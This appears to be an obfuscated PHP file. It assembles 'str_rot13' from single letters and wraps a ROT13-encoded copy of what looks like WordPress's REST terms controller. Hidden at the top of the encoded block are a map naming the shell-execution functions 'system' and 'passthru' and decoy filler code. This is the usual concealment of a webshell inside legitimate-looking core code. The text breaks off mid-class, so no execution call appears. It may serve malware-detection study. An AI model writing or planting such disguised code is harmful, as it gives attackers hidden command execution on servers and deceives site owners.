<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Grezf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pynff hfrq gb znantrq grezf nffbpvngrq jvgu n gnkbabzl ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Grezf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Gnkbabzl xrl.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	cebgrpgrq $gnkbabzl;

	/**
	 * Vafgnapr bs n grez zrgn svryqf bowrpg.
	 *
	 * @fvapr 4.7.0
	 * @ine JC_ERFG_Grez_Zrgn_Svryqf
	 */
	cebgrpgrq $zrgn;

	/**
	 * Pbyhza gb unir gur grezf or fbegrq ol.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	cebgrpgrq $fbeg_pbyhza;

	/**
	 * Ahzore bs grezf gung jrer sbhaq.
	 *
	 * @fvapr 4.7.0
	 * @ine vag
	 */
	cebgrpgrq $gbgny_grezf;

	/**
	 * Jurgure gur pbagebyyre fhccbegf ongpuvat.
	 *
	 * @fvapr 5.9.0
	 * @ine neenl
	 */
	cebgrpgrq $nyybj_ongpu = neenl( 'i1' => gehr );

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl xrl.
	 */
	choyvp shapgvba __pbafgehpg( $gnkbabzl ) {
		$guvf->gnkbabzl  = $gnkbabzl;
		$gnk_bow         = trg_gnkbabzl( $gnkbabzl );
		$guvf->erfg_onfr = ! rzcgl( $gnk_bow->erfg_onfr ) ? $gnk_bow->erfg_onfr : $gnk_bow->anzr;
		$guvf->anzrfcnpr = ! rzcgl( $gnk_bow->erfg_anzrfcnpr ) ? $gnk_bow->erfg_anzrfcnpr : 'jc/i2';

		$guvf->zrgn = arj JC_ERFG_Grez_Zrgn_Svryqf( $gnkbabzl );
	}

	/**
	 * Ertvfgref gur ebhgrf sbe grezf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'perngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'perngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::PERNGNOYR ),
				),
				'nyybj_ongpu' => $guvf->nyybj_ongpu,
				'fpurzn'      => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[\q]+)',
			neenl(
				'netf'        => neenl(
					'vq' => neenl(
						'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur grez.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'hcqngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'sbepr' => neenl(
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => snyfr,
							'qrfpevcgvba' => __( 'Erdhverq gb or gehr, nf grezf qb abg fhccbeg genfuvat.' ),
						),
					),
				),
				'nyybj_ongpu' => $guvf->nyybj_ongpu,
				'fpurzn'      => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs gur grezf sbe n cbfg pna or ernq.
	 *
	 * @fvapr 6.0.3
	 *
	 * @cnenz JC_Cbfg         $cbfg    Cbfg bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea obby Jurgure gur grezf sbe gur cbfg pna or ernq.
	 */
	choyvp shapgvba purpx_ernq_grezf_crezvffvba_sbe_cbfg( $cbfg, $erdhrfg ) {
		// Vs gur erdhrfgrq cbfg vfa'g nffbpvngrq jvgu guvf gnkbabzl, qral npprff.
		vs ( ! vf_bowrpg_va_gnkbabzl( $cbfg->cbfg_glcr, $guvf->gnkbabzl ) ) {
			erghea snyfr;
		}

		// Tenag npprff vs gur cbfg vf choyvpyl ivrjnoyr.
		vs ( vf_cbfg_choyvpyl_ivrjnoyr( $cbfg ) ) {
			erghea gehr;
		}

		// Bgurejvfr tenag npprff vs gur cbfg vf ernqnoyr ol gur ybttrq-va hfre.
		vs ( pheerag_hfre_pna( 'ernq_cbfg', $cbfg->VQ ) ) {
			erghea gehr;
		}

		// Bgurejvfr, qral npprff.
		erghea snyfr;
	}

	/**
	 * Purpxf vs n erdhrfg unf npprff gb ernq grezf va gur fcrpvsvrq gnkbabzl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea obby|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, bgurejvfr snyfr be JC_Reebe bowrpg.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		$gnk_bow = trg_gnkbabzl( $guvf->gnkbabzl );

		vs ( ! $gnk_bow || ! $guvf->purpx_vf_gnkbabzl_nyybjrq( $guvf->gnkbabzl ) ) {
			erghea snyfr;
		}

		vs ( 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( $gnk_bow->pnc->rqvg_grezf ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_pbagrkg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg grezf va guvf gnkbabzl.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! rzcgl( $erdhrfg['cbfg'] ) ) {
			$cbfg = trg_cbfg( $erdhrfg['cbfg'] );

			vs ( ! $cbfg ) {
				erghea arj JC_Reebe(
					'erfg_cbfg_vainyvq_vq',
					__( 'Vainyvq cbfg VQ.' ),
					neenl(
						'fgnghf' => 400,
					)
				);
			}

			vs ( ! $guvf->purpx_ernq_grezf_crezvffvba_sbe_cbfg( $cbfg, $erdhrfg ) ) {
				erghea arj JC_Reebe(
					'erfg_sbeovqqra_pbagrkg',
					__( 'Fbeel, lbh ner abg nyybjrq gb ivrj grezf sbe guvf cbfg.' ),
					neenl(
						'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
					)
				);
			}
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf grezf nffbpvngrq jvgu n gnkbabzl.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 6.8.0 Erfcrpg qrsnhyg dhrel nethzragf frg sbe gur gnkbabzl hcba ertvfgengvba.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {

		// Ergevrir gur yvfg bs ertvfgrerq pbyyrpgvba dhrel cnenzrgref.
		$ertvfgrerq = $guvf->trg_pbyyrpgvba_cnenzf();

		/*
		 * Guvf neenl qrsvarf znccvatf orgjrra choyvp NCV dhrel cnenzrgref jubfr
		 * inyhrf ner npprcgrq nf-cnffrq, naq gurve vagreany JC_Dhrel cnenzrgre
		 * anzr rdhvinyragf (fbzr ner gur fnzr). Bayl inyhrf juvpu ner nyfb
		 * cerfrag va $ertvfgrerq jvyy or frg.
		 */
		$cnenzrgre_znccvatf = neenl(
			'rkpyhqr'    => 'rkpyhqr',
			'vapyhqr'    => 'vapyhqr',
			'beqre'      => 'beqre',
			'beqreol'    => 'beqreol',
			'cbfg'       => 'cbfg',
			'uvqr_rzcgl' => 'uvqr_rzcgl',
			'cre_cntr'   => 'ahzore',
			'frnepu'     => 'frnepu',
			'fyht'       => 'fyht',
		);

		$cercnerq_netf = neenl( 'gnkbabzl' => $guvf->gnkbabzl );

		/*
		 * Sbe rnpu xabja cnenzrgre juvpu vf obgu ertvfgrerq naq cerfrag va gur erdhrfg,
		 * frg gur cnenzrgre'f inyhr ba gur dhrel $cercnerq_netf.
		 */
		sbernpu ( $cnenzrgre_znccvatf nf $ncv_cnenz => $jc_cnenz ) {
			vs ( vffrg( $ertvfgrerq[ $ncv_cnenz ], $erdhrfg[ $ncv_cnenz ] ) ) {
				$cercnerq_netf[ $jc_cnenz ] = $erdhrfg[ $ncv_cnenz ];
			}
		}

		vs ( vffrg( $cercnerq_netf['beqreol'] ) && vffrg( $erdhrfg['beqreol'] ) ) {
			$beqreol_znccvatf = neenl(
				'vapyhqr_fyhtf' => 'fyht__va',
			);

			vs ( vffrg( $beqreol_znccvatf[ $erdhrfg['beqreol'] ] ) ) {
				$cercnerq_netf['beqreol'] = $beqreol_znccvatf[ $erdhrfg['beqreol'] ];
			}
		}

		vs ( vffrg( $ertvfgrerq['bssfrg'] ) && ! rzcgl( $erdhrfg['bssfrg'] ) ) {
			$cercnerq_netf['bssfrg'] = $erdhrfg['bssfrg'];
		} ryfr {
			$cercnerq_netf['bssfrg'] = ( $erdhrfg['cntr'] - 1 ) * $cercnerq_netf['ahzore'];
		}

		$gnkbabzl_bow = trg_gnkbabzl( $guvf->gnkbabzl );

		vs ( $gnkbabzl_bow->uvrenepuvpny && vffrg( $ertvfgrerq['cnerag'], $erdhrfg['cnerag'] ) ) {
			vs ( 0 === $erdhrfg['cnerag'] ) {
				// Bayl dhrel gbc-yriry grezf.
				$cercnerq_netf['cnerag'] = 0;
			} ryfr {
				vs ( $erdhrfg['cnerag'] ) {
					$cercnerq_netf['cnerag'] = $erdhrfg['cnerag'];
				}
			}
		}

		/*
		 * Jura n gnkbabzl vf ertvfgrerq jvgu na 'netf' neenl,
		 * gubfr cnenzf bireevqr gur `$netf` cnffrq gb guvf shapgvba.
		 *
		 * Jr bayl arrq gb qb guvf vs ab `cbfg` nethzrag vf cebivqrq.
		 * Bgurejvfr, grezf jvyy or srgpurq hfvat `jc_trg_bowrpg_grezf()`,
		 * juvpu erfcrpgf gur qrsnhyg dhrel nethzragf frg sbe gur gnkbabzl.
		 */
		vs (
			rzcgl( $cercnerq_netf['cbfg'] ) &&
			vffrg( $gnkbabzl_bow->netf ) &&
			vf_neenl( $gnkbabzl_bow->netf )
		) {
			$cercnerq_netf = neenl_zretr( $cercnerq_netf, $gnkbabzl_bow->netf );
		}

		$vf_urnq_erdhrfg = $erdhrfg->vf_zrgubq( 'URNQ' );
		vs ( $vf_urnq_erdhrfg ) {
			// Sbepr gur 'svryqf' nethzrag. Sbe URNQ erdhrfgf, bayl grez VQf ner erdhverq.
			$cercnerq_netf['svryqf'] = 'vqf';
			// Qvfnoyr cevzvat grez zrgn sbe URNQ erdhrfgf gb vzcebir cresbeznapr.
			$cercnerq_netf['hcqngr_grez_zrgn_pnpur'] = snyfr;
		}

		/**
		 * Svygref trg_grezf() nethzragf jura dhrelvat grezf ivn gur ERFG NCV.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->gnkbabzl`, ersref gb gur gnkbabzl fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_pngrtbel_dhrel`
		 *  - `erfg_cbfg_gnt_dhrel`
		 *
		 * Ranoyrf nqqvat rkgen nethzragf be frggvat qrsnhygf sbe n grezf
		 * pbyyrpgvba erdhrfg.
		 *
		 * @fvapr 4.7.0
		 *
		 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/trg_grezf/
		 *
		 * @cnenz neenl           $cercnerq_netf Neenl bs nethzragf sbe trg_grezf().
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Gur ERFG NCV erdhrfg.
		 */
		$cercnerq_netf = nccyl_svygref( \"erfg_{$guvf->gnkbabzl}_dhrel\", $cercnerq_netf, $erdhrfg );

		vs ( ! rzcgl( $cercnerq_netf['cbfg'] ) ) {
			$dhrel_erfhyg = jc_trg_bowrpg_grezf( $cercnerq_netf['cbfg'], $guvf->gnkbabzl, $cercnerq_netf );

			// Hfrq jura pnyyvat jc_pbhag_grezf() orybj.
			$cercnerq_netf['bowrpg_vqf'] = $cercnerq_netf['cbfg'];
		} ryfr {
			$dhrel_erfhyg = trg_grezf( $cercnerq_netf );
		}

		$pbhag_netf = $cercnerq_netf;

		hafrg( $pbhag_netf['ahzore'], $pbhag_netf['bssfrg'] );

		$gbgny_grezf = jc_pbhag_grezf( $pbhag_netf );

		// jc_pbhag_grezf() pna erghea n snyfrl inyhr jura gur grez unf ab puvyqera.
		vs ( ! $gbgny_grezf ) {
			$gbgny_grezf = 0;
		}

		vs ( ! $vf_urnq_erdhrfg ) {
			$erfcbafr = neenl();
			sbernpu ( $dhrel_erfhyg nf $grez ) {
				$qngn       = $guvf->cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg );
				$erfcbafr[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
			}
		}

		$erfcbafr = $vf_urnq_erdhrfg ? arj JC_ERFG_Erfcbafr( neenl() ) : erfg_rafher_erfcbafr( $erfcbafr );

		// Fgber cntvangvba inyhrf sbe urnqref.
		$cre_cntr = (vag) $cercnerq_netf['ahzore'];
		$cntr     = (vag) prvy( ( ( (vag) $cercnerq_netf['bssfrg'] ) / $cre_cntr ) + 1 );

		$erfcbafr->urnqre( 'K-JC-Gbgny', (vag) $gbgny_grezf );

		$znk_cntrf = (vag) prvy( $gbgny_grezf / $cre_cntr );

		$erfcbafr->urnqre( 'K-JC-GbgnyCntrf', $znk_cntrf );

		$erdhrfg_cnenzf = $erdhrfg->trg_dhrel_cnenzf();
		$pbyyrpgvba_hey = erfg_hey( erfg_trg_ebhgr_sbe_gnkbabzl_vgrzf( $guvf->gnkbabzl ) );
		$onfr           = nqq_dhrel_net( heyrapbqr_qrrc( $erdhrfg_cnenzf ), $pbyyrpgvba_hey );

		vs ( $cntr > 1 ) {
			$ceri_cntr = $cntr - 1;

			vs ( $ceri_cntr > $znk_cntrf ) {
				$ceri_cntr = $znk_cntrf;
			}

			$ceri_yvax = nqq_dhrel_net( 'cntr', $ceri_cntr, $onfr );
			$erfcbafr->yvax_urnqre( 'ceri', $ceri_yvax );
		}
		vs ( $znk_cntrf > $cntr ) {
			$arkg_cntr = $cntr + 1;
			$arkg_yvax = nqq_dhrel_net( 'cntr', $arkg_cntr, $onfr );

			$erfcbafr->yvax_urnqre( 'arkg', $arkg_yvax );
		}

		erghea $erfcbafr;
	}

	/**
	 * Trg gur grez, vs gur VQ vf inyvq.
	 *
	 * @fvapr 4.7.2
	 *
	 * @cnenz vag $vq Fhccyvrq VQ.
	 * @erghea JC_Grez|JC_Reebe Grez bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_grez( $vq ) {
		$reebe = arj JC_Reebe(
			'erfg_grez_vainyvq',
			__( 'Grez qbrf abg rkvfg.' ),
			neenl( 'fgnghf' => 404 )
		);

		vs ( ! $guvf->purpx_vf_gnkbabzl_nyybjrq( $guvf->gnkbabzl ) ) {
			erghea $reebe;
		}

		vs ( (vag) $vq <= 0 ) {
			erghea $reebe;
		}

		$grez = trg_grez( (vag) $vq, $guvf->gnkbabzl );
		vs ( rzcgl( $grez ) || $grez->gnkbabzl !== $guvf->gnkbabzl ) {
			erghea $reebe;
		}

		erghea $grez;
	}

	/**
	 * Purpxf vs n erdhrfg unf npprff gb ernq be rqvg gur fcrpvsvrq grez.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, bgurejvfr JC_Reebe bowrpg.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$grez = $guvf->trg_grez( $erdhrfg['vq'] );

		vs ( vf_jc_reebe( $grez ) ) {
			erghea $grez;
		}

		vs ( 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( 'rqvg_grez', $grez->grez_vq ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_pbagrkg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf grez.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Trgf n fvatyr grez sebz n gnkbabzl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$grez = $guvf->trg_grez( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $grez ) ) {
			erghea $grez;
		}

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Purpxf vs n erdhrfg unf npprff gb perngr n grez.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea obby|JC_Reebe Gehr vs gur erdhrfg unf npprff gb perngr vgrzf, bgurejvfr snyfr be JC_Reebe bowrpg.
	 */
	choyvp shapgvba perngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {

		vs ( ! $guvf->purpx_vf_gnkbabzl_nyybjrq( $guvf->gnkbabzl ) ) {
			erghea snyfr;
		}

		$gnkbabzl_bow = trg_gnkbabzl( $guvf->gnkbabzl );

		vs ( ( vf_gnkbabzl_uvrenepuvpny( $guvf->gnkbabzl )
				&& ! pheerag_hfre_pna( $gnkbabzl_bow->pnc->rqvg_grezf ) )
			|| ( ! vf_gnkbabzl_uvrenepuvpny( $guvf->gnkbabzl )
				&& ! pheerag_hfre_pna( $gnkbabzl_bow->pnc->nffvta_grezf ) ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_perngr',
				__( 'Fbeel, lbh ner abg nyybjrq gb perngr grezf va guvf gnkbabzl.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Perngrf n fvatyr grez va n gnkbabzl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		vs ( vffrg( $erdhrfg['cnerag'] ) ) {
			vs ( ! vf_gnkbabzl_uvrenepuvpny( $guvf->gnkbabzl ) ) {
				erghea arj JC_Reebe(
					'erfg_gnkbabzl_abg_uvrenepuvpny',
					__( 'Pnaabg frg cnerag grez, gnkbabzl vf abg uvrenepuvpny.' ),
					neenl( 'fgnghf' => 400 )
				);
			}

			$cnerag = trg_grez( (vag) $erdhrfg['cnerag'], $guvf->gnkbabzl );

			vs ( ! $cnerag ) {
				erghea arj JC_Reebe(
					'erfg_grez_vainyvq',
					__( 'Cnerag grez qbrf abg rkvfg.' ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		$cercnerq_grez = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		$grez = jc_vafreg_grez( jc_fynfu( $cercnerq_grez->anzr ), $guvf->gnkbabzl, jc_fynfu( (neenl) $cercnerq_grez ) );
		vs ( vf_jc_reebe( $grez ) ) {
			/*
			 * Vs jr'er tbvat gb vasbez gur pyvrag gung gur grez nyernql rkvfgf,
			 * tvir gurz gur vqragvsvre sbe shgher hfr.
			 */
			$grez_vq = $grez->trg_reebe_qngn( 'grez_rkvfgf' );
			vs ( $grez_vq ) {
				$rkvfgvat_grez = trg_grez( $grez_vq, $guvf->gnkbabzl );
				$grez->nqq_qngn( $rkvfgvat_grez->grez_vq, 'grez_rkvfgf' );
				$grez->nqq_qngn(
					neenl(
						'fgnghf'  => 400,
						'grez_vq' => $grez_vq,
					)
				);
			}

			erghea $grez;
		}

		$grez = trg_grez( $grez['grez_vq'], $guvf->gnkbabzl );

		/**
		 * Sverf nsgre n fvatyr grez vf perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->gnkbabzl`, ersref gb gur gnkbabzl fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_vafreg_pngrtbel`
		 *  - `erfg_vafreg_cbfg_gnt`
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Grez         $grez     Vafregrq be hcqngrq grez bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg  Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat Gehr jura perngvat n grez, snyfr jura hcqngvat.
		 */
		qb_npgvba( \"erfg_vafreg_{$guvf->gnkbabzl}\", $grez, $erdhrfg, gehr );

		$fpurzn = $guvf->trg_vgrz_fpurzn();
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $grez->grez_vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $grez, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		/**
		 * Sverf nsgre n fvatyr grez vf pbzcyrgryl perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->gnkbabzl`, ersref gb gur gnkbabzl fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_nsgre_vafreg_pngrtbel`
		 *  - `erfg_nsgre_vafreg_cbfg_gnt`
		 *
		 * @fvapr 5.0.0
		 *
		 * @cnenz JC_Grez         $grez     Vafregrq be hcqngrq grez bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg  Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat Gehr jura perngvat n grez, snyfr jura hcqngvat.
		 */
		qb_npgvba( \"erfg_nsgre_vafreg_{$guvf->gnkbabzl}\", $grez, $erdhrfg, gehr );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$erfcbafr->frg_fgnghf( 201 );
		$erfcbafr->urnqre( 'Ybpngvba', erfg_hey( $guvf->anzrfcnpr . '/' . $guvf->erfg_onfr . '/' . $grez->grez_vq ) );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n erdhrfg unf npprff gb hcqngr gur fcrpvsvrq grez.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb hcqngr gur vgrz, snyfr be JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$grez = $guvf->trg_grez( $erdhrfg['vq'] );

		vs ( vf_jc_reebe( $grez ) ) {
			erghea $grez;
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_grez', $grez->grez_vq ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_hcqngr',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf grez.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Hcqngrf n fvatyr grez sebz n gnkbabzl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		$grez = $guvf->trg_grez( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $grez ) ) {
			erghea $grez;
		}

		vs ( vffrg( $erdhrfg['cnerag'] ) ) {
			vs ( ! vf_gnkbabzl_uvrenepuvpny( $guvf->gnkbabzl ) ) {
				erghea arj JC_Reebe(
					'erfg_gnkbabzl_abg_uvrenepuvpny',
					__( 'Pnaabg frg cnerag grez, gnkbabzl vf abg uvrenepuvpny.' ),
					neenl( 'fgnghf' => 400 )
				);
			}

			$cnerag = trg_grez( (vag) $erdhrfg['cnerag'], $guvf->gnkbabzl );

			vs ( ! $cnerag ) {
				erghea arj JC_Reebe(
					'erfg_grez_vainyvq',
					__( 'Cnerag grez qbrf abg rkvfg.' ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		$cercnerq_grez = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		// Bayl hcqngr gur grez vs jr unir fbzrguvat gb hcqngr.
		vs ( ! rzcgl( $cercnerq_grez ) ) {
			$hcqngr = jc_hcqngr_grez( $grez->grez_vq, $grez->gnkbabzl, jc_fynfu( (neenl) $cercnerq_grez ) );

			vs ( vf_jc_reebe( $hcqngr ) ) {
				erghea $hcqngr;
			}
		}

		$grez = trg_grez( $grez->grez_vq, $guvf->gnkbabzl );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-grezf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_vafreg_{$guvf->gnkbabzl}\", $grez, $erdhrfg, snyfr );

		$fpurzn = $guvf->trg_vgrz_fpurzn();
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $grez->grez_vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $grez, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-grezf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_nsgre_vafreg_{$guvf->gnkbabzl}\", $grez, $erdhrfg, snyfr );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
